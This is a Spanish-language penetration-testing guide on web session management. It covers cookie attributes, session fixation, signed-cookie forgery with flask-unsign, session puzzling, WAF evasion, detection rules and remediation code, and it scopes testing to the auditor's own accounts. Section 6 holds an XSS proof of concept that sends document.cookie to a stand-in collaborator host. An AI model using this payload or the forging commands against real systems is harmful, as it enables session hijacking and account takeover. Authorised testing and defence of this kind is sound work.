# Gestión de sesiones (Session Management)

| Clasificación | |
|---|---|
| CWE | CWE-384 — Session Fixation; CWE-613 — Insufficient Session Expiration; CWE-614 — Sensitive Cookie in HTTPS Session Without 'Secure' Attribute; CWE-1004 — Sensitive Cookie Without 'HttpOnly' Flag; CWE-1275 — Sensitive Cookie with Improper SameSite Attribute; CWE-330 — Use of Insufficiently Random Values; CWE-598 — Use of GET Request Method With Sensitive Query Strings; CWE-488 — Exposure of Data Element to Wrong Session; CWE-565 — Reliance on Cookies without Validation and Integrity Checking |
| OWASP Top 10:2025 | A07 — Authentication Failures (A02 — Security Misconfiguration para atributos de cookie; A04 — Cryptographic Failures para tokens predecibles o claves de firma débiles) |
| OWASP API Top 10:2023 | API2 — Broken Authentication |
| WSTG | WSTG-SESS-01 (esquema), -02 (atributos de cookie), -03 (fijación), -04 (variables expuestas), -06 (logout), -07 (timeout), -08 (session puzzling), -09 (secuestro), -11 (sesiones concurrentes, versión *latest*) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación (atributos de cookie, entropía y tokens predecibles, cookies firmadas, fijación, logout e invalidación, timeouts, sesiones concurrentes, session puzzling, token en URL y exposición, cookie tossing) · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

HTTP no tiene estado: tras autenticar, el servidor entrega un **identificador de sesión** (cookie, token opaco o JWT) que el navegador reenvía en cada petición. Quien posee ese identificador *es* el usuario. La gestión de sesiones abarca cómo se genera, transporta, protege, renueva y destruye.

Fallos típicos:
- **Generación débil**: identificadores cortos, secuenciales o derivados de datos conocidos (usuario, hora), que se pueden predecir. La **entropía** es la cantidad de incertidumbre real del identificador; OWASP recomienda al menos 64 bits efectivos, y en la práctica 128 bits de un generador criptográfico (CSPRNG).
- **Transporte y almacenamiento**: cookies sin `Secure`, `HttpOnly` o `SameSite`, dominios demasiado amplios, identificadores en la URL.
- **Ciclo de vida**: no se renueva al iniciar sesión (**fijación de sesión**: el atacante impone un identificador conocido y espera a que la víctima se autentique con él), no se invalida en el servidor al cerrar sesión o cambiar la contraseña, no caduca.
- **Estado confuso** (**session puzzling** o sobrecarga de variables de sesión): la misma variable de sesión se usa en flujos distintos y uno la rellena de forma que otro confía en ella.
- **Sesiones en el cliente** (cookies firmadas o cifradas, JWT): su seguridad depende de la clave; si se filtra o es débil, el atacante fabrica sesiones.

## 2. Dónde buscar (señales del reconocimiento)

- Todas las cabeceras `Set-Cookie` del flujo (anónimo, login, MFA, cambio de rol, logout) y sus atributos.
- Nombres que delatan tecnología: `JSESSIONID` (Java), `PHPSESSID`, `ASP.NET_SessionId`, `.AspNetCore.Cookies`, `connect.sid` (Express), `session` (Flask, formato `eyJ…` + `.` + firma), `_<app>_session` (Rails), `laravel_session` y `XSRF-TOKEN`, `sessionid` (Django), `csrftoken`, cookies `remember_*`.
- Tokens en URL: `;jsessionid=`, `?sid=`, `?token=`, `?session=`, enlaces de email o "compartir".
- Almacenamiento web (`localStorage`) con tokens; respuestas con tokens en el cuerpo.
- Subdominios del mismo dominio padre (`*.target.tld`) que podrían leer o fijar cookies (blogs, entornos de pruebas, servicios de terceros con CNAME).
- Caché: cabeceras `Cache-Control` en páginas autenticadas.

## 3. Detección segura (primeras sondas, no destructivas)

Todo se hace con cuentas del auditor. Ninguna sonda de esta sección afecta a otros usuarios.

```bash
# Atributos de cookies en cada respuesta relevante
curl -sk -D - -o /dev/null https://app.target.tld/login | grep -i '^set-cookie'
curl -sk -D - -o /dev/null -X POST https://app.target.tld/login \
     -d 'user=cuentaA@auditor.tld&pass=<pass_de_prueba>' | grep -i '^set-cookie'
```

Lista de comprobación inicial:
1. ¿Cambia el identificador tras el login, tras el MFA y tras subir de privilegio? (fijación)
2. Tras el logout, ¿el identificador antiguo sigue funcionando en `GET /api/me`? (invalidación)
3. ¿Se pueden tener dos sesiones simultáneas? ¿Al cambiar la contraseña se cierran las demás?
4. ¿Cuánto dura una sesión inactiva y cuánto como máximo absoluto?
5. Recoger 20–30 identificadores consecutivos (logins sucesivos) para análisis de entropía. Para miles de muestras con Burp Sequencer, ⚠️ el volumen de logins puede disparar alertas o bloqueos: acuerda el ritmo con el cliente.

## 4. Explotación por contexto o tecnología

### 4.1 Atributos de cookie

| Atributo | Valor esperado en cookie de sesión | Riesgo si falta |
|---|---|---|
| `Secure` | presente | se envía por HTTP en claro (red hostil, degradación a HTTP, subdominio sin TLS) |
| `HttpOnly` | presente | legible por JavaScript: un XSS roba la sesión (`document.cookie`) |
| `SameSite` | `Lax` o `Strict` (`None` solo con motivo y siempre con `Secure`) | facilita CSRF y fugas en peticiones entre sitios (ver `vulns/csrf.md`) |
| `Domain` | ausente (solo el host exacto) | `Domain=target.tld` envía la cookie a todos los subdominios |
| `Path` | `/` o el de la app | no es una frontera de seguridad, pero rutas amplias aumentan la exposición |
| `Expires`/`Max-Age` | ausente (cookie de sesión) o corto | cookie persistente en disco y en equipos compartidos |
| Prefijo | `__Host-` (exige `Secure`, `Path=/` y sin `Domain`) | sin prefijo, un subdominio o una conexión HTTP puede sobrescribirla |

Notas:
- Chrome aplica `SameSite=Lax` por defecto a cookies sin atributo, pero con una excepción de dos minutos para peticiones `POST` de nivel superior tras crear la cookie ("Lax+POST"); Firefox y Safari tienen comportamientos distintos. No asumas protección sin comprobar el navegador objetivo.
- Mezcla de "sitio" y "origen": `SameSite` considera el mismo sitio a `a.target.tld` y `b.target.tld`; un XSS en cualquier subdominio sortea `SameSite`.
- HSTS ausente o sin `includeSubDomains` hace explotable la falta de `Secure` en redes hostiles (ver `vulns/config-exposure.md`).

### 4.2 Entropía y tokens predecibles

- Decodifica (Base64, hex, URL) y busca estructura: usuario, ID numérico, marca de tiempo, IP, contador.
- Compara tokens obtenidos en logins consecutivos: prefijos comunes, partes que crecen, longitud efectiva.
- Burp Sequencer: captura la respuesta que emite el token, configura su ubicación y analiza ≥ 5000 muestras para un resultado fiable (resultado en "bits efectivos").
- Patrones débiles: `md5(username)`, `md5(username + date)`, `base64(user_id:timestamp)`, UUIDv1, `Math.random()`, `rand()`/`mt_rand()` sembrados con la hora, contadores.

```bash
# Muestreo rápido de tokens propios (bajo volumen) para inspección manual
for i in $(seq 1 20); do
  curl -sk -D - -o /dev/null -X POST https://app.target.tld/login \
    -d 'user=cuentaA@auditor.tld&pass=<pass_de_prueba>' | grep -io 'sessionid=[^;]*'
  sleep 2
done
```

### 4.3 Sesiones en el cliente: cookies firmadas o cifradas

Si la sesión vive en una cookie firmada, la integridad depende de la clave del servidor.

```bash
# Flask (itsdangerous)
flask-unsign --decode --cookie 'eyJ1c2VyIjoiQSJ9.Z...'
flask-unsign --unsign --cookie 'eyJ1c2VyIjoiQSJ9.Z...' --wordlist secretos.txt --no-literal-eval
flask-unsign --sign --cookie "{'user': 'cuentaB'}" --secret '<clave_encontrada>'
```

- **Express `cookie-session`/`cookie-parser` firmado**: la clave de `keys`/`secret` en el código o por defecto en plantillas.
- **Rails**: `secret_key_base` filtrado → descifrar y fabricar la cookie de sesión.
- **Laravel**: `APP_KEY` filtrado (`.env` expuesto) → descifrar cookies; en versiones con deserialización de cookies, RCE (ver `vulns/deserialization.md`).
- **Django**: `SECRET_KEY` filtrado → firmar sesiones con el backend `signed_cookies`; con el serializador antiguo `PickleSerializer` implica RCE.
- **ASP.NET**: `machineKey` filtrado en `web.config` → falsificar `ViewState` y cookies de formularios (ver `vulns/deserialization.md`).
- Cookies sin firma con estado de autorización (`role=user`, `isAdmin=false`, `uid=1043`): cámbialas directamente.
- JWT como sesión: ver `vulns/jwt.md`.

Encontrar la clave suele requerir otra vulnerabilidad (exposición de `.env`, LFI, repositorio): ver `vulns/config-exposure.md` y `vulns/path-traversal-lfi.md`.

### 4.4 Fijación de sesión

```text
1. Navegador anónimo: GET /login → Set-Cookie: SESSID=abc123
2. Login con cuentaA usando SESSID=abc123
3. ¿El servidor emite un SESSID nuevo?  NO → fijación posible
4. Desde otro navegador/cliente con SESSID=abc123: GET /api/me → ¿datos de cuentaA? → confirmado
```

Formas de imponer el identificador a la víctima (para la PoC, la "víctima" es la cuenta `B` del auditor en otro navegador):
- Identificador aceptado por URL (`/login;jsessionid=abc123`, `?PHPSESSID=abc123`) cuando el servidor lo admite (`session.use_trans_sid`, `session.use_only_cookies=0` en PHP).
- Sesiones "permisivas" que aceptan cualquier valor que envíe el cliente (`session.use_strict_mode=0` en PHP).
- Inyección de cookie desde un subdominio controlado o vulnerable (`Set-Cookie: SESSID=abc123; Domain=target.tld`), inyección CRLF en una respuesta (`vulns/otras-inyecciones.md`) o XSS en un subdominio.
- **Desbordamiento del almacén de cookies** (*cookie jar overflow*): desde JavaScript se crean cientos de cookies hasta que el navegador expulsa las antiguas (incluida la `HttpOnly`) y después se fija una nueva con el valor del atacante. Requiere ejecución de JS en el sitio o un subdominio.
- Revisa también la renovación tras MFA y tras elevar privilegios (modo administrador, "sudo mode").

### 4.5 Logout, invalidación y revocación

- Tras el logout, reenvía una petición autenticada con el identificador antiguo. Si funciona, el logout solo borró la cookie del navegador.
- Con JWT sin estado: el token sigue siendo válido hasta `exp` tras el logout; documenta la vida útil y si existe lista de revocación.
- Cambio o reseteo de contraseña, desactivación de cuenta, cambio de email, eliminación de rol o expulsión de una organización: las sesiones existentes (y *refresh tokens*, tokens "recordarme", claves API) deberían invalidarse o reevaluar permisos.
- Logout en SSO: ¿cierra la sesión local y la del IdP? ¿Se puede forzar el logout de la víctima por CSRF (`GET /logout`)? Es un hallazgo menor salvo que facilite otro ataque (login CSRF, ver `vulns/oauth-oidc-saml.md`).

### 4.6 Tiempos de expiración

- **Inactividad**: deja la sesión sin uso (15–30 min según criticidad) y reintenta.
- **Absoluto**: una sesión activa debería terminar tras un máximo (por ejemplo 8–12 h en aplicaciones sensibles).
- Comprueba si la expiración es solo del lado del cliente (JavaScript redirige al login pero la API sigue aceptando el identificador).
- Peticiones automáticas de la SPA (sondeo cada X segundos) que mantienen la sesión viva indefinidamente.

### 4.7 Sesiones concurrentes

- Inicia sesión con la misma cuenta en dos clientes; según la política del cliente, la segunda puede invalidar la primera o coexistir.
- ¿Existe un listado de sesiones activas y opción de cerrarlas? ¿Funciona el cierre remoto (ver también IDOR en `/api/users/{id}/sessions`, `vulns/access-control-idor.md`)?
- ¿Se notifica un login nuevo? En aplicaciones de alta criticidad la ausencia de control es un hallazgo de defensa en profundidad.

### 4.8 Session puzzling

La aplicación usa una variable de sesión (por ejemplo `session["user"]`) en dos contextos con distinto nivel de confianza.

```text
Ejemplo 1 (recuperación de contraseña):
  POST /forgot  user=cuentaB@auditor.tld   → el servidor guarda session["user"]="cuentaB"
  GET  /account                             → la página de cuenta lee session["user"] y muestra cuentaB

Ejemplo 2 (asistente de varios pasos):
  Paso 1 de un flujo de A guarda session["order_id"]=X; el paso 3 de otro flujo usa session["order_id"] sin revalidar.

Ejemplo 3 (MFA):
  session["uid"] se rellena tras la contraseña; un endpoint distinto del panel solo comprueba que exista session["uid"].
```

Procedimiento: lista los puntos de entrada que escriben en la sesión sin autenticación completa (recuperación, registro, MFA, carrito, idioma) y, tras cada uno, visita páginas autenticadas observando qué identidad o estado reflejan.

### 4.9 Token en URL y exposición de variables de sesión

- Identificadores o tokens en query string acaban en logs del servidor y de proxies, en el historial, en `Referer` hacia terceros y en herramientas de analítica. Busca en la página recursos externos que recibirían el `Referer` y revisa la `Referrer-Policy`.
- Páginas autenticadas cacheables (`Cache-Control: public` o ausente) en proxies compartidos o en la caché del navegador (botón "atrás" tras logout). Ver `vulns/cache-poisoning-deception.md` para el engaño de caché web.
- Tokens en respuestas JSON accesibles entre orígenes (CORS mal configurado, ver `vulns/cors.md`) o en JSONP.
- Identificadores enviados por HTTP en algún recurso mixto o subdominio sin TLS.

### 4.10 Cookie tossing y precedencia de cookies

Un subdominio controlado por el atacante (o vulnerable a XSS/subdomain takeover) puede crear `Set-Cookie: session=valor_del_atacante; Domain=target.tld; Path=/api`. El navegador envía ambas cookies y la de `Path` más específico va primero; muchos frameworks usan la primera. Efectos: fijación, forzar a la víctima a usar la sesión del atacante en una ruta concreta, o romper CSRF basado en doble cookie. Mitigación: prefijo `__Host-`.

## 5. Evasión de filtros y WAF

- Enviar el identificador en otras ubicaciones aceptadas por el framework (`;jsessionid=` en Java, parámetro en PHP, cabecera `X-Session-Id` en APIs) para saltarse controles que solo miran la cookie.
- Cookies duplicadas con distinta capitalización o con espacios (`Session=`, ` session=`), y codificación URL en el valor: parsers diferentes entre WAF y aplicación.
- Para firma de cookies, prueba algoritmos o formatos alternativos admitidos por la librería (cookie sin firma cuando el código cae a modo "sin firmar" si falta la firma).
- Técnicas generales en `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- **XSS + `HttpOnly` ausente** → robo de sesión. PoC con la cuenta `B` del auditor: `fetch('https://corvus-collab.oastify.example/?c='+encodeURIComponent(document.cookie))`. Ver `vulns/xss.md`.
- **Fijación + vector de inyección de cookie** → secuestro de la sesión de `B` tras su login.
- **Clave de firma filtrada** → fabricar sesión de cualquier usuario; demuéstralo fabricando la sesión de la cuenta `B` del auditor. ⚠️ Fabricar sesiones de usuarios reales o de administradores **requiere confirmación explícita del cliente**.
- **Logout/cambio de contraseña sin invalidación** + token robado → persistencia del atacante incluso tras la reacción de la víctima.
- **Token en URL + recurso de terceros** → fuga a ese tercero (demuestra la cabecera `Referer` saliente con el token).
- **Session puzzling** → suplantación o salto de pasos de autenticación (ver `vulns/business-logic.md`).

## 7. Caja blanca: fuentes, sumideros y patrones de código

```js
// Express + express-session
app.use(session({ secret: 'keyboard cat', cookie: {} }));                // vulnerable: secreto de ejemplo, sin flags
app.use(session({
  name: '__Host-sid', secret: process.env.SESSION_SECRET, resave: false, saveUninitialized: false,
  cookie: { httpOnly: true, secure: true, sameSite: 'lax', path: '/', maxAge: 8 * 3600e3 },
  rolling: true,
}));
app.post('/login', async (req, res, next) => {
  const user = await authenticate(req.body);
  if (!user) return res.sendStatus(401);
  req.session.regenerate(err => {                                       // evita fijación
    if (err) return next(err);
    req.session.uid = user.id; req.session.authTime = Date.now();
    res.sendStatus(204);
  });
});
app.post('/logout', (req, res) => req.session.destroy(() => res.clearCookie('__Host-sid').sendStatus(204)));
```

```php
// PHP: php.ini / ini_set
session.use_strict_mode = 1      ; rechaza IDs no generados por el servidor
session.use_only_cookies = 1     ; session.use_trans_sid = 0
session.cookie_httponly = 1      ; session.cookie_secure = 1 ; session.cookie_samesite = "Lax"
// tras autenticar:
session_regenerate_id(true);
```

```python
# Django settings.py
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = "Lax"
SESSION_COOKIE_AGE = 8 * 3600
CSRF_COOKIE_SECURE = True
# django.contrib.auth.login() rota la clave de sesión; update_session_auth_hash() tras cambio de contraseña
# Flask: app.secret_key = "dev" (vulnerable); SESSION_COOKIE_SECURE/HTTPONLY/SAMESITE en app.config
```

```java
// Spring Security: protección de fijación (por defecto changeSessionId) y control de concurrencia
http.sessionManagement(s -> s.sessionFixation(f -> f.changeSessionId())
    .maximumSessions(1).maxSessionsPreventsLogin(false));
// web.xml: <tracking-mode>COOKIE</tracking-mode> para impedir ;jsessionid en URL
// <cookie-config><http-only>true</http-only><secure>true</secure></cookie-config>
```

```bash
rg -n -i "secret\s*[:=]\s*['\"](keyboard cat|secret|changeme|dev|development|s3cr3t)['\"]"
rg -n -i 'secret_key\s*=|SECRET_KEY\s*=|secret_key_base|APP_KEY=|machineKey'
rg -n -i 'httpOnly\s*:\s*false|secure\s*:\s*false|samesite\s*[:=]\s*.?none|SESSION_COOKIE_(SECURE|HTTPONLY)\s*=\s*False'
rg -n -i 'use_trans_sid|use_only_cookies\s*=\s*0|use_strict_mode\s*=\s*0|jsessionid'
rg -n -i '(login|authenticate|signin)' -A15 | rg -i 'session' | rg -v -i 'regenerate|cycle_key|changeSessionId|session_regenerate_id|reset_session|rotate'
rg -n -i 'logout' -A10 | rg -i 'clearCookie|delete_cookie|cookies\.delete' # comprobar que también destruye en servidor
```
```yaml
rules:
- id: corvus-express-session-insecure-cookie
  languages: [javascript, typescript]
  severity: WARNING
  message: express-session sin cookie.secure/httpOnly o con secreto literal
  pattern-either:
    - pattern: 'session({..., secret: "...", ...})'
    - pattern: 'session({..., cookie: {..., secure: false, ...}, ...})'
    - pattern: 'session({..., cookie: {..., httpOnly: false, ...}, ...})'
- id: corvus-flask-hardcoded-secret
  languages: [python]
  severity: ERROR
  message: Clave de firma de sesión literal en el código
  pattern-either:
    - pattern: $APP.secret_key = "..."
    - pattern: $APP.config["SECRET_KEY"] = "..."
```

## 8. Falsos positivos frecuentes

- Falta de `HttpOnly` en cookies que no son de sesión (preferencias, analítica, token CSRF de doble envío que JS debe leer): no es un hallazgo de sesión.
- Falta de `Secure` con HSTS con `preload` e `includeSubDomains` y sin ningún servicio HTTP: riesgo residual bajo; repórtalo como informativo o bajo.
- Cookie de sesión que no cambia tras el login pero la autenticación reside en otra cookie que sí se emite nueva (por ejemplo `.AspNetCore.Identity.Application`); revisa todas.
- JWT que sigue funcionando tras logout con una vida útil corta (≤ 15 min) y refresh token revocado: limitación conocida, severidad baja.
- Burp Sequencer con pocas muestras da resultados poco fiables; no reportes "baja entropía" sin un patrón demostrado o un análisis con muestras suficientes.
- Sesiones concurrentes permitidas por diseño en una aplicación de bajo riesgo.

## 9. Evidencia mínima para validarlo

- Cabeceras `Set-Cookie` completas (redacta valores), con la URL y la respuesta donde aparecen.
- Fijación: identificador antes y después del login (idéntico) y una petición desde otro cliente con ese identificador que devuelve la identidad autenticada.
- Invalidación: petición de logout (o cambio de contraseña) con marca temporal y petición posterior con el identificador antiguo que responde con datos autenticados.
- Predecibilidad: muestras, patrón deducido y un identificador predicho que es válido (de la cuenta del auditor).
- Clave de firma: cookie fabricada, clave usada (o su origen) y respuesta autenticada como la cuenta `B` del auditor.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Falta de `Secure`/`HttpOnly`/`SameSite` sin vector de explotación demostrado | `AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N` (3.1) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Sesión no invalidada en logout/cambio de contraseña | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N` (5.9) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Fijación de sesión con vector de inyección demostrado | `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N` (6.8) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:A/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Identificador predecible o clave de firma débil → cualquier sesión | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` (9.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Token de sesión en URL filtrado a terceros | `AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N` (5.3) | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |

Si la sesión comprometida es de administración o la clave de firma da RCE (deserialización), eleva el impacto en consecuencia. Calcula la puntuación 4.0 exacta en la calculadora de FIRST.

## 11. Remediación (con ejemplo de código correcto)

- Identificadores de ≥128 bits de un CSPRNG, generados solo por el servidor (rechazar IDs desconocidos), usando el gestor de sesiones del framework en lugar de uno propio.
- Cookie de sesión `__Host-`, `Secure`, `HttpOnly`, `SameSite=Lax` (o `Strict`), sin `Domain`, sin `Expires` salvo "recordarme" explícito; HSTS con `includeSubDomains`.
- Regenerar el identificador al autenticar, al completar MFA y al cambiar de privilegio; nunca aceptar IDs en la URL.
- Invalidación en servidor al hacer logout; cierre de todas las sesiones y tokens persistentes al cambiar o resetear la contraseña, al cambiar el email o al revocar permisos; lista de revocación para JWT o vida útil corta con refresh tokens revocables.
- Expiración por inactividad y absoluta aplicada en el servidor; reautenticación para acciones críticas.
- Panel de sesiones activas con cierre remoto y notificación de nuevos inicios de sesión en aplicaciones sensibles.
- Variables de sesión con nombres y propósitos distintos por flujo; no marcar a un usuario como identificado hasta completar la autenticación.
- Claves de firma de sesión aleatorias, en un gestor de secretos, rotadas, y nunca valores de ejemplo; considerar la vinculación de la sesión al dispositivo (por ejemplo, Device Bound Session Credentials en Chrome) en aplicaciones de alto riesgo.
- `Cache-Control: no-store` en respuestas autenticadas y `Referrer-Policy: strict-origin-when-cross-origin` o `no-referrer`.

```python
# Flask: configuración segura y rotación al autenticar (con Flask-Login)
app.config.update(
    SECRET_KEY=os.environ["FLASK_SECRET_KEY"],          # ≥ 32 bytes aleatorios
    SESSION_COOKIE_NAME="__Host-session",
    SESSION_COOKIE_SECURE=True, SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE="Lax",
    PERMANENT_SESSION_LIFETIME=timedelta(hours=8),
)
@app.post("/login")
def login():
    user = authenticate(request.form)
    if not user:
        abort(401)
    session.clear()                                      # descarta el estado previo (anti-fijación/puzzling)
    login_user(user)
    session["auth_time"] = int(time.time())
    return "", 204
# Para invalidar en servidor, usar un backend de sesión con estado (Flask-Session + Redis) en lugar de cookies firmadas.
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

- **Burp Proxy / Repeater**: inspección de `Set-Cookie`, reutilización de identificadores tras logout y entre clientes; **Burp Sequencer** para entropía (tras confirmar con el cliente el volumen de logins).
- **Herramientas de desarrollo del navegador** (pestaña Application/Storage): atributos efectivos de cookies, `localStorage`, comportamiento `SameSite`.
- **flask-unsign** (Flask) o scripts propios con la librería del framework para cookies firmadas; **jwt_tool** para JWT (`vulns/jwt.md`).
- **curl** para pruebas reproducibles del ciclo de vida; **Logger++** (Burp) para filtrar todas las respuestas con `Set-Cookie`.
- **testssl.sh** / cabeceras HSTS para valorar el riesgo de `Secure` ausente.
- **semgrep / ripgrep** (sección 7).

## 13. Referencias

- OWASP WSTG — 4.6 Session Management Testing (WSTG-SESS-01…11).
- OWASP Cheat Sheets: Session Management, Cookie Theft Mitigation, HTTP Strict Transport Security.
- RFC 6265 y borrador RFC 6265bis (cookies, `SameSite`, prefijos `__Host-`/`__Secure-`).
- PortSwigger Web Security Academy — SameSite cookie restrictions; Burp Sequencer documentation.
- PayloadsAllTheThings — Session/Cookie related sections; HackTricks — Cookies Hacking (cookie tossing, cookie jar overflow), Session puzzling.
- MITRE CWE-384, CWE-613, CWE-614, CWE-1004, CWE-1275, CWE-330, CWE-598, CWE-488.
